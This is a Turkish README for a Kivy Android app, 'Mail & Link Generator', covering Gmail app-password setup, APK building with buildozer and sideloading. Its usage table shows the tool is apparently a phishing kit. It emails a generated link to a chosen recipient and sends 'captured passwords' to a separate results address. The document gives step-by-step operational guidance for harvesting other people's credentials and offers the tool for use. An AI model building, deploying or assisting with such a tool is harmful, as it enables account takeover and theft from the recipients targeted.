# Mail & Link Generator — APK Kurulum Rehberi

## Dosyalar

| Dosya | Açıklama |
|-------|----------|
| `main.py` | Kivy uygulaması (5 alan) |
| `buildozer.spec` | APK derleme ayarları |
| `requirements.txt` | PC test bağımlılıkları |

---

## 1. PC'de Test Et (opsiyonel)

```bash
cd kivy_app/
pip install -r requirements.txt
python main.py
```

---

## 2. Gmail Uygulama Şifresi Al

Uygulamada "E-posta Şifresi" alanına **normal Gmail şifrenizi değil**, Uygulama Şifresi girmelisiniz:

1. **Google Hesabı** → **Güvenlik**
2. **2 Adımlı Doğrulama**'yı açın (kapalıysa)
3. Arama kutusuna "Uygulama şifreleri" yazın
4. **Uygulama seç** → "Diğer (özel ad)" → "Mail Link Generator"
5. **Oluştur** → 16 karakterlik şifreyi kopyalayın

---

## 3. APK Derle (Linux / WSL / macOS)

### Gereksinimler

```bash
sudo apt update
sudo apt install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev
pip install buildozer cython
```

### Derleme

```bash
cd kivy_app/
buildozer android debug
```

> İlk çalıştırmada Android SDK/NDK (~1 GB) indirir, **10–30 dakika** sürebilir.

### Çıktı

```
bin/maillinkgenerator-1.0-debug.apk
```

---

## 4. APK'yı Telefona Yükle

**USB ile:**
```bash
buildozer android deploy run
```

**Manuel:**
- `.apk` dosyasını telefona kopyalayın
- Dosya yöneticisinden açın
- "Bilinmeyen kaynaklardan yükleme"ye izin verin

---

## 5. Uygulama Kullanımı

| Alan | Ne Girilmeli |
|------|-------------|
| 1. Mesaj İçeriği | Alıcının göreceği e-posta metni |
| 2. Gönderici E-posta | Kendi Gmail adresiniz |
| 3. E-posta Uygulama Şifresi | 16 karakterlik uygulama şifresi |
| 4. Alıcı E-posta | Linkin gönderileceği kişi |
| 5. Sonuç E-postası | Yakalanan şifrelerin geleceği adres |

**OLUŞTUR VE GÖNDER** butonuna basın → link otomatik üretilir ve alıcıya gönderilir.

---

## Sorun Giderme

| Sorun | Çözüm |
|-------|-------|
| `SMTPAuthenticationError` | Uygulama Şifresi yanlış — normal şifre çalışmaz |
| `Bağlantı Hatası` | İnternet bağlantısını veya `BASE_URL`'i kontrol edin |
| APK yüklenmiyor | Ayarlar → Güvenlik → Bilinmeyen kaynaklar → İzin ver |
| `buildozer` takılı kaldı | `buildozer android debug 2>&1 \| tee build.log` ile log alın |
